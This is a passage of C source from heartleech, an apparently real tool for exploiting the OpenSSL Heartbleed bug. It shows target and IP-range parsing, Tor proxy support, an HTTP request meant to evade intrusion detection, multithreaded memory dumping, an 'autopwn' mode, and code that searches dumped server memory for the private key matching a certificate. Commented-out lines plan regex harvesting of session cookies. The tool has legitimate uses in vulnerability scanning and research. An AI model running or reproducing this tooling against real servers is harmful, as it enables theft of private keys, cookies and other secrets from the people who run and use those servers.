    /*
     * Read in the file to process
     */
    fp = fopen(filename_bin, "rb");
    if (fp == NULL) {
        perror(filename_bin);
        goto end;
    }
    while (!feof(fp)) {
        unsigned char buf[65536 + 18];
        size_t bytes_read;

        bytes_read = fread(buf, 1, sizeof(buf), fp);
        if (bytes_read == 0)
            break;

        if (args->patterns.count) {
            scan_patterns(args, buf, bytes_read);
        }

        if (filename_cert) {
            if (find_private_key(n, e, buf, bytes_read)) {
                fprintf(stderr, "found: offset=%llu\n", offset);
                exit(1);
            }
        }

        offset += bytes_read;

        if (offset > last_offset + 1024*1024) {
            printf("%llu bytes read          \r", offset);
            last_offset = offset;
        }
    }
    fclose(fp);



    end:
    X509_free(cert);
}


/******************************************************************************
 * Tests if the named parameter on the command-line. We do a little
 * more than a straight string compare, because I get confused
 * whether parameter have punctuation. Is it "--excludefile" or
 * "--exclude-file"? I don't know if it's got that dash. Screw it,
 * I'll just make the code so it don't care.
 ******************************************************************************/
static int
EQUALS(const char *lhs, const char *rhs)
{
    for (;;) {
        while (*lhs == '-' || *lhs == '.' || *lhs == '_')
            lhs++;
        while (*rhs == '-' || *rhs == '.' || *rhs == '_')
            rhs++;
        if (*lhs == '\0' && *rhs == '[')
            return 1; /*arrays*/
        if (*lhs == '\0' && *rhs == '=')
            return 1; /*equals*/
        if (*lhs == '\0' && *rhs == ':')
            return 1; /*equals*/
        if (tolower(*lhs & 0xFF) != tolower(*rhs & 0xFF))
            return 0;
        if (*lhs == '\0')
            return 1;
        lhs++;
        rhs++;
    }
}

/******************************************************************************
 ******************************************************************************/
static char *
initialize_http(const struct Target *target)
{
    /*
     * Format the HTTP request. We need to stick the "Host:" header in
     * the correct place in the header
     */
    static const char *prototype =
    "GET / HTTP/1.1\r\n"
    "Host: \r\n"
    "User-agent: test/1.0\r\n"
    "Connection: keep-alive\r\n"
    "\r\n";
    size_t prefix;
    char *request;
    const char *hostname = target->hostname;
    size_t hostname_length = strlen(hostname);

    request = (char*)malloc(strlen(prototype) + hostname_length + 1);
    memcpy(request, prototype, strlen(prototype) + 1);
    prefix = strstr(prototype, "Host: ") - prototype + 6;
    memcpy(request + prefix, hostname, hostname_length);
    memcpy(request + prefix + hostname_length,
           prototype + prefix,
           strlen(prototype+prefix) + 1);
    return request;
}

/******************************************************************************
 ******************************************************************************/
size_t
index_of(const char *str, const char *substring)
{
    size_t i;
    for (i=0; str[i]; i++) {
        if (str[i] == substring[0] && memcmp(str+i, substring, strlen(substring)))
            return i;
    }
    return ~0;
}

/******************************************************************************
 ******************************************************************************/
void
x_split(const char hostname[], unsigned host_index, unsigned host_length,
            unsigned *r_host_index, unsigned *r_host_length,
            unsigned *r_range_index, unsigned *r_range_length)
{
    unsigned i;

    *r_range_index = *r_host_index;
    *r_range_length = *r_host_length;

    for (i=host_index; i<host_length; i++) {
        if (!isdigit(hostname[i]) && hostname[i] != '.')
            return;
    }
    for (i=host_index; i<host_length; i++) {
        if (hostname[i] == '-') {
            *r_host_length = i - host_index;
            *r_range_index = i + 1;
            *r_range_length = host_length - i - 1;
            return;
        }
    }
}

/******************************************************************************
 ******************************************************************************/
static void
target_add2(struct TargetList *targets, const char *hostname,
    unsigned host_index, unsigned host_length,
    const char *portname, unsigned port_index)
{
    struct Target *target;

    /* 
     * Expand the list to accomodate the new target 
     */
    if (targets->count + 1 >= targets->max) {
        size_t new_max = targets->max * 2 + 1;
        if (targets->list) {
            targets->list = (struct Target*)realloc(
                                                    targets->list,
                                                    new_max * sizeof(targets->list[0]));
        } else {
            targets->list = (struct Target*)malloc(
                                                   new_max * sizeof(targets->list[0]));
            
        }
        targets->max = new_max;
    }
    target = &targets->list[targets->count++];
    memset(target, 0, sizeof(*target));

    
    
    
    target->hostname = (char*)malloc(host_length + 1);
    memcpy(target->hostname, &hostname[host_index], host_length + 1);
    target->hostname[host_length] = '\0';

    /* parse port */
    while (portname[port_index] && ispunct(portname[port_index]&0xFF))
        port_index++;
    target->port = strtoul(&portname[port_index], 0, 0);
    if (target->port == 0 || target->port > 65535)
        target->port = 0x10000; /* default for Tor */
}

/******************************************************************************
 * Add a target to our list, when scanning multiple targets
 ******************************************************************************/
static void
target_add(struct TargetList *targets, const char *hostname)
{
    unsigned port_index;
    unsigned host_index = 0;
    unsigned host_length;
    unsigned range_index;
    unsigned range_length;

    
    /*
     * parse for port info 
     */
    if (hostname[0] == '[' && strchr(hostname, ']')) {
        port_index = strchr(hostname, ']') - hostname;
        host_index = 1;
    } else if (strrchr(hostname, ':'))
        port_index = strrchr(hostname, ':') - hostname;
    else
        port_index = strlen(hostname);
    host_length = port_index - host_index;
    

    /*
     * Parse for range
     */
    x_split(hostname, host_index, host_length,
            &host_index, &host_length,
            &range_index, &range_length);


    /*
     * Add target
     * - either this name/IPv4/IPv6 address
     * - or this IPv4-IPv4 range
     */
    if (host_index == range_index) {
        target_add2(targets, hostname, host_index, host_length, hostname, port_index);
    } else {
        size_t n;
        char *host1 = malloc(host_length+1);
        char *host2 = malloc(range_length+1);
        unsigned char foo[16];
        unsigned char type = 0;
        unsigned ip_start;
        unsigned ip_stop;
        
        memcpy(host1, hostname+host_index, host_length);
        host1[host_length] = '\0';
        memcpy(host2, hostname+range_index, range_length);
        host2[range_length] = '\0';
        
        n = my_inet_pton(host1, foo, 0, sizeof(foo), &type);
        if (type != 1) {
            fprintf(stderr, "[-] bad range spec: %s\n", hostname);
            exit(1);
        }
        ip_start = foo[0]<<24 | foo[1]<<16 | foo[2]<<8 | foo[3];
        type = 0;

        n = my_inet_pton(host2, foo, 0, sizeof(foo), &type);
        if (type != 1) {
            fprintf(stderr, "[-] bad range spec: %s\n", hostname);
            exit(1);
        }
        ip_stop = foo[0]<<24 | foo[1]<<16 | foo[2]<<8 | foo[3];


        while (ip_start <= ip_stop) {
            char host2[32];
            snprintf(host2, sizeof(host2), "%u.%u.%u.%u",
                (ip_start>>24)&0xFF,
                (ip_start>>16)&0xFF,
                (ip_start>> 8)&0xFF,
                (ip_start>> 0)&0xFF);
            target_add2(targets, host2, 0, strlen(host2), hostname, port_index);
            ip_start++;
        }
    }
}


/******************************************************************************
 * Called by the configuration-reading function for processing options
 * specified on the command-line, in configuration files, in environmental
 * variables, and so forth.
 ******************************************************************************/
static void
print_usage()
{
    printf("\n");
    printf("usage:\n");
    printf(" heartleech --scanlist <file> [--threads <n>]\n");
    printf("   scans the listed targets for heartbleed vulnerability\n");
    printf(" heartleech <hostname> --dump <file> [--threads <n>]\n");
    printf("   aggressively dumps heartbleed info to file for later processing\n");
    printf(" heartleech --cert <cert> --read <file>\n");
    printf("   looks for matching private key in dump file\n");
    printf(" heartleech <hostname> --autopwn [--threads <n>]\n");
    printf("   automatically scans vulnerable host for private key\n");
    printf("use '-d' option to debug what's going wrong\n");
    exit(1);
}

/******************************************************************************
 * Called by the configuration-reading function for processing options
 * specified on the command-line, in configuration files, in environmental
 * variables, and so forth.
 ******************************************************************************/
static unsigned
heartleech_set_parameter(struct DumpArgs *args,
                            const char name[], const char value[])
{
    if (EQUALS("autopwn", name)) {
        args->is_auto_pwn = 1;
        return 0;
    } else if (EQUALS("cert", name)) {
        if (args->cert_filename) {
            fprintf(stderr, "certificate file already specified: %s\n",
                    args->cert_filename);
            free(args->cert_filename);
        }
        args->cert_filename = (char*)malloc(strlen(value)+1);
        memcpy(args->cert_filename, value, strlen(value)+1);
        return 1;
    } else if (EQUALS("dump", name)) {
        if (args->dump_filename) {
            fprintf(stderr, "dump file already specified: %s\n",
                    args->dump_filename);
            free(args->dump_filename);
        }
        args->dump_filename = (char*)malloc(strlen(value)+1);
        memcpy(args->dump_filename, value, strlen(value)+1);
        args->op = Op_Dump;
        return 1;
    } else if (EQUALS("help", name)) {
        print_usage();
        return 0;
    } else if (EQUALS("ipv4", name)) {
        args->ip_ver = 4;
        return 0;
    } else if (EQUALS("ipv6", name)) {
        args->ip_ver = 6;
        return 0;
    } else if (EQUALS("ipver", name)) {
        unsigned long x = strtoul(value, 0, 0);
        switch (x) {
            case 4: heartleech_set_parameter(args, "ipv4", ""); break;
            case 6: heartleech_set_parameter(args, "ipv6", ""); break;
            default:
                fprintf(stderr, "%lu: unknown IP version (must be 4 or 6)\n",
                        x);
                exit(1);
        }
        return 1;
    } else if (EQUALS("loop", name) || EQUALS("loops", name)) {
        if (!isdigit(value[0] & 0xFF))
            fprintf(stderr, "loop: bad value: %s\n", value);
        else {
            args->cfg_loopcount = strtoul(value, 0, 0);
        }
        return 1;
    } else if (EQUALS("port", name)) {
        if (!isdigit(value[0] & 0xFF) || strtoul(value, 0, 0) > 65535) {
            fprintf(stderr, "loop: bad value: %s\n", value);
            exit(1);
        } else {
            args->default_port = strtoul(value, 0, 0);
        }
        return 1;
    } else if (EQUALS("proxy", name)) {
        unsigned port_index;
        unsigned host_index = 0;
        unsigned host_length;

        /* Find port spec, if there is one */
        if (value[0] == '[' && strchr(value, ']')) {
            port_index = strchr(value, ']') - value;
            host_index = 1;
        } else if (strrchr(value, ':'))
            port_index = strrchr(value, ':') - value;
        else
            port_index = strlen(value);
        host_length = port_index - host_index;

        /* allocate name for proxy host */
        if (args->proxy.host) {
            fprintf(stderr, "[-] proxy specified more than once\n");
            free(args->proxy.host);
        }
        args->proxy.host = (char*)malloc(host_length + 1);
        memcpy(args->proxy.host, &value[host_index], host_length + 1);
        args->proxy.host[host_length] = '\0';

        /* parse port */
        while (value[port_index] && ispunct(value[port_index]&0xFF))
            port_index++;
        args->proxy.port = strtoul(&value[port_index], 0, 0);

        if (args->proxy.port == 0 || args->proxy.port > 65535)
            args->proxy.port = 9150; /* default for Tor */

        return 1;
    } else if (EQUALS("rand", name)) {
        args->is_rand_size = 1;
        return 0; /* no 'value' argument */
    } else if (EQUALS("raw", name)) {
        args->is_raw = 1;
        return 0; /* no 'value' argument */
    } else if (EQUALS("read", name)) {
        if (args->offline_filename) {
            fprintf(stderr, "[-] offline file already specified: %s\n",
                    args->offline_filename);
            free(args->offline_filename);
        }
        args->offline_filename = (char*)malloc(strlen(value)+1);
        memcpy(args->offline_filename, value, strlen(value)+1);
        args->op = Op_Offline;
        return 1;
    } else if (EQUALS("scan", name)) {
        args->op = Op_Scan;
        args->is_scan = 1;
        is_scan = 1;
        return 0; /* no 'value' argument */
    } else if (EQUALS("threads", name) || EQUALS("thread", name)) {
        args->threads.desired = strtoul(value, 0, 0);
        return 1;
    } else if (EQUALS("scanlist", name)) {
        FILE *fp;
        heartleech_set_parameter(args, "scan", "true");
        fp = fopen(value, "rt");
        if (fp == NULL) {
            perror(value);
            exit(1);
        }
        for (;;) {
            char line[512];
            if (fgets(line, sizeof(line), fp) == 0)
                break;
            while (line[0] && isspace(line[strlen(line)-1] & 0xFF))
                line[strlen(line)-1] = '\0';
            while (line[0] && isspace(line[0]&0xFF))
                memmove(line, line+1, strlen(line));
            if (line[0] == '#' || line[0] == ';' || line[0] == '/')
                continue;
            if (line[0] == '\0')
                continue;
            heartleech_set_parameter(args, "target", line);
        }
        fclose(fp);
        return 1;
    } else if (EQUALS("target", name)) {
        target_add(&args->targets, value);
        if (args->op == 0)
            args->op = Op_Dump;
        return 1;
    } else if (EQUALS("timeout", name)) {
        args->timeout = strtoul(value, 0, 0);
        return 1;
    } else {
        ERROR_MSG("[-] unknown parameter: %s\n", name);
        exit(1);
    }
}


/******************************************************************************
 * Parse the command-line, looking for configuration parameters.
 ******************************************************************************/
static void
read_configuration(struct DumpArgs *args, int argc, char *argv[])
{
    int i;

    for (i=1; i<argc; i++) {
        char c;
        const char *arg;

        /*
         * --longform parameters
         */
        if (argv[i][0] == '-' && argv[i][1] == '-') {
            if (strchr(argv[i], '='))
                arg = strchr(argv[i], '=') + 1;
            else if (strchr(argv[i], ':'))
                arg = strchr(argv[i], ':') + 1;
            else {
                if (i+1 < argc)
                    arg = argv[i+1];
                else
                    arg = "";
            }
            if (heartleech_set_parameter(args, argv[i], arg)) {
                /* these can be of the form either "--name" or "--name value",
                 * in which case we'll need to increment the index, because
                 * the parameter has been consumed */
                i++;
            }
            continue;
        }

        /* All parameters start with the standard '-'. If it doesn't, then
         * it's assumed to be the target. Only one target can be specified
         * on the commandline -- when scanning many targets, they must come
         * from a file. */
        if (argv[i][0] != '-') {
            heartleech_set_parameter(args, "target", argv[i]);
            continue;
        }

        /*
         * parameters can be either of two ways:
         * -twww.google.com
         * -t www.google.com
         */
        c = argv[i][1];
        if (c == 'd' || c == 'a' || c == 'S' || c == 'h' || c == '?')
            ;
        else if (argv[i][2] == '\0') {
            arg = argv[++i];
            if (i >= argc) {
                fprintf(stderr, "[-] -%c: missing parameter\n", c);
                exit(1);
            }
        } else
            arg = argv[i] + 2;

        /*
         * Get the parameter
         */
        switch (c) {
            case 'd': is_debug++; break;
            case 'a': heartleech_set_parameter(args, "autopwn", ""); break;
            case 'c': heartleech_set_parameter(args, "cert", arg); break;
            case 't': heartleech_set_parameter(args, "target", arg); break;
            case 'f': heartleech_set_parameter(args, "dump", arg); break;
            case 'F': heartleech_set_parameter(args, "read", arg); break;
            case 'l': heartleech_set_parameter(args, "loop", arg); break;
            case 'p': heartleech_set_parameter(args, "port", arg); break;
            case 'S': heartleech_set_parameter(args, "rand", arg); break;
            case 'v': heartleech_set_parameter(args, "ipver", arg); break;
            case '?': heartleech_set_parameter(args, "help", arg); break;
            case 'h': heartleech_set_parameter(args, "help", arg); break;
            case 'H': heartleech_set_parameter(args, "help", arg); break;
            default:
                fprintf(stderr, "[-] -%c: unknown argument\n", c);
                exit(1);
        }
    }

}

/******************************************************************************
 * Retrieves a target from the list of targets
 ******************************************************************************/
struct Target
target_get(const struct DumpArgs *cargs)
{
    struct DumpArgs *args = (struct DumpArgs *)cargs;
    struct Target result;
    
    memset(&result, 0, sizeof(result));

    /*
     * Remove the target from the list
     */
    pthread_mutex_lock(&args->mutex);
    if (args->targets.count) {
        args->targets.count--;
        result = args->targets.list[args->targets.count];
    }
    pthread_mutex_unlock(&args->mutex);
    
    /*
     * Do some initialization on optional fields
     */
    BN_init(&result.n);
    BN_init(&result.e);
    result.loop.desired = args->cfg_loopcount;
    if (result.port > 65535)
        result.port = args->default_port;

    return result;
}


/******************************************************************************
 ******************************************************************************/
static void
target_free(struct Target *target)
{
    if (target->hostname)
        free(target->hostname);
    if (target->http_request)
        free(target->http_request);
    
    BN_clear(&target->n);
    BN_clear(&target->e);
    memset(target, 0, sizeof(*target));
}


/******************************************************************************
 * We may want to run many threads on the same target, dumping the contents.
 * To do this, we just create many duplicate versions of the target.
 *
 * The deal is this: when running a scan of a lot of hosts, a single host will
 * just have 1 thread handling it. However, when doing a "dump" from a single
 * host, you may want to have multiple threads in order to dump information
 * from that host faster. Thus, we clone the "target" record for each
 * thread, making the other parts of the system think it's scanning many
 * hosts when it's really just one.
 ******************************************************************************/
static void
split_targets(struct DumpArgs *args)
{
    size_t new_count;
    struct TargetList *targets = &args->targets;
    size_t i;
    
    if (args->targets.count == 0)
        return;
    if (args->threads.desired <= 1)
        return;

    /* Create one version of the target for each thread */
    new_count = args->threads.desired * targets->count;

    /* Create a new target list */
    targets->list = realloc(targets->list, new_count*sizeof(targets->list[0]));
    targets->max = new_count;

    /* Now make all the copies */
    for (i=targets->count; i<new_count; i++) {
        struct Target *new_target = &targets->list[i];
        struct Target *old_target = &targets->list[i % targets->count];

        memcpy(new_target, old_target, sizeof(*old_target));
        new_target->hostname = strdup(old_target->hostname);
    }

    targets->count = new_count;
}


/******************************************************************************
 * Scan/dump a list of targets.
 *
 * Sadly, this is non-cohesive task, where we may be scanning or dumping
 * depending upon command-line line flags. A "scan" stops interacting with
 * a host once it's found it's verdict, whereas a "dump" continues grabbing
 * data, looping around and reconnecting to the target.
 ******************************************************************************/
static void
run_scan(const struct DumpArgs *args)
{

    while (args->targets.count) {
        struct Target target;
        unsigned is_starttls = 0;

        /*
         * Remove the next target to be processed in a thread-safe manner
         */
        target = target_get(args);

        
        /* Figure out the application-layer information. This is used for 
         * two purposes. The first is in the case of "STARTTL" negotiating
         * that must happen in certain protocols (like SMTP, POP3, etc.)
         * before SSL happens. The second is for operations to keep the 
         * connection open after the handshake is over, such as HTTP GET
         * or SMTP NOOP. */
        target.application = port_to_app(target.port, &is_starttls);
        if (is_starttls)
            target.starttls = target.application;

        /* If doing HTTP, then we need to format an HTTP request in order to
         * keep the connection open and to evade IDS. This request will set
         * the "host" field appropriately in the request */
        if (target.application == APP_HTTP)
            target.http_request = initialize_http(&target);

        /*
         * Continue creating connections to the target until we are done.
         * Note that multiple heartbleeds may be done per connection.
         */
        while (target.loop.done < target.loop.desired) {
            int x;
            x = ssl_thread(args, &target);
            if (x < 0)
                break;
        }

        /*
         * Print verdict, if doing a "scan". If doing a "dump", this won't
         * be printed.
         */
        if (args->is_scan) {
            switch (target.scan_result) {
                case Verdict_Safe:
                    printf("%s:%u: SAFE\n",
                           target.hostname, target.port);
                    break;
                case Verdict_Vulnerable:
                    printf("%s:%u: VULNERABLE\n",
                           target.hostname, target.port);
                    break;
                case Verdict_Inconclusive_NoDNS:
                    printf("%s:%u: INCONCLUSIVE: DNS failed\n",
                           target.hostname, target.port);
                    break;
                case Verdict_Inconclusive_NoTcp:
                    printf("%s:%u: INCONCLUSIVE: TCP connect failed\n",
                           target.hostname, target.port);
                    break;
                case Verdict_Inconclusive_NoSsl:
                    printf("%s:%u: INCONCLUSIVE: SSL handshake failed\n",
                           target.hostname, target.port);
                    break;
                default:
                    printf("%s:%u: INCONCLUSIVE\n",
                           target.hostname, target.port);
                    break;
            }
        }

        /*
         * Free the resources used by the target
         */
        target_free(&target);
    }

    /* We did a sync_add() to this variable before launching this thread,
     * and now we do a sync_sub() to indicate that the thread is done.
     * The master thread waits for this count to go to zero before
     * it exits the program */
    __sync_fetch_and_sub(&((struct DumpArgs*)args)->threads.running, 1);
}


/******************************************************************************
 ******************************************************************************/
int
main(int argc, char *argv[])
{
    struct DumpArgs args;

    memset(&args, 0, sizeof(args));
    pthread_mutex_init(&args.mutex, 0);
    args.default_port = 443;
    args.cfg_loopcount = 1000000;
    args.timeout = 6;
    
    fprintf(stderr, "\n--- heartleech/1.0.0i ---\n");
    fprintf(stderr, "https://github.com/robertdavidgraham/heartleech\n");

    /*
     * NOT HERE YET
     * In the future, I'm going to load PCRE and search the dumped data for
     * patterns, such as as Cookies and passwords
     */
    //load_pcre();
    //pattern_add(&args.patterns, "[a-zA-Z]*[sS][eE][sS][sS][iI][oO][nN][a-zA-Z0-9=]*;");
    //pattern_add(&args.patterns, "ASPSESSION[A-Z]*=[A-Z]*;");


    /*
     * Print usage information
     */
    if (argc <= 1 ) {
    usage:
        print_usage();
    }

    /*
     * One-time program startup stuff for legacy Windows.
     */
#if defined(WIN32)
    {WSADATA x; WSAStartup(0x101,&x);}
#endif


    /*
     * One-time program startup stuff for OpenSSL.
     */
    CRYPTO_malloc_init();
    SSL_library_init();
    SSL_load_error_strings();
    ERR_load_BIO_strings();
    OpenSSL_add_all_algorithms();

    /*
     * Verify that we have the proper version of the OpenSSL library.
     * Heartbeats weren't enabled until version 1.0.1, so if we accidentally
     * link to an earlier library, the program will work but will ignore the
     * returned heartbeat information. This happens in places like Mac OS X,
     * which has OpenSSL-0.9.8 included with the OS, and will link to that
     * by preference.
     */
    if (SSLeay() < 0x01000100) {
        ERROR_MSG("[-] heartbeats unsupported in local SSL library: %s\n",
                  SSLeay_version(SSLEAY_VERSION));
        ERROR_MSG("[-] must link to OpenSSL/1.0.1a or later\n");
        exit(1);
    }
    DEBUG_MSG("[+] local OpenSSL 0x%x(%s)\n",
              SSLeay(), SSLeay_version(SSLEAY_VERSION));

    /*
     * Read in the configuration information
     */
    read_configuration(&args, argc, argv);

    /*
     * Open the output/dump file.
     */
    if (args.dump_filename && args.fp == NULL) {
        if (strncmp(args.dump_filename, "-", strlen(args.dump_filename)) == 0) {
            args.fp = stdout;
        } else {
            args.fp = fopen(args.dump_filename, "ab+");
        }
        if (args.fp == NULL) {
            perror(args.dump_filename);
            return -1;
        }
    }

    /*
     * Depending on the configuration, perform a certain operation
     */
    switch (args.op) {
        case Op_None:
        case Op_Error:
        default:
            goto usage;

        case Op_Dump:
            split_targets(&args);
            /* drop down */

        case Op_Scan:
            /* scan/dump one or more targets */
            if (args.targets.count == 0) {
                ERROR_MSG("[-] most specify target host\n");
                exit(1);
            }
            if (args.threads.desired == 0)
                run_scan(&args);
            else {
                /* if multi-threaded, then launch many threads */
                unsigned i;
                for (i=0; i<args.threads.desired; i++) {
                    pthread_t handle;
                    __sync_fetch_and_add(&args.threads.running, 1);
                    pthread_create(&handle, 0, (void*(*)(void*))run_scan, &args);
                }
                while (args.threads.running)
                    usleep(1000);
            }
            return 0;

        case Op_Offline:
            if (args.offline_filename == 0) {
                ERROR_MSG("[-] must specify file to read from\n");
                ERROR_MSG("[-]   heartleech --read <filename> ...\n");
                exit(1);
            }
            if (args.cert_filename == 0) {
                    ERROR_MSG("[-] must specify certificate file to use\n");
                    ERROR_MSG("[-]   heartleech --cert <filename> ...\n");
                    /* don't exit, because in the future we'll be doing
                     * pattern-matching as well as certificate dumping */
            }
            process_offline_file(&args, 
                                 args.cert_filename, 
                                 args.offline_filename);
            return 0;
    }


    /*
     * Finished. We should do a more gracefull close, but I'm lazy
     */
    if (args.fp) {
        fclose(args.fp);
        args.fp = NULL;
    }

    return 0;
}
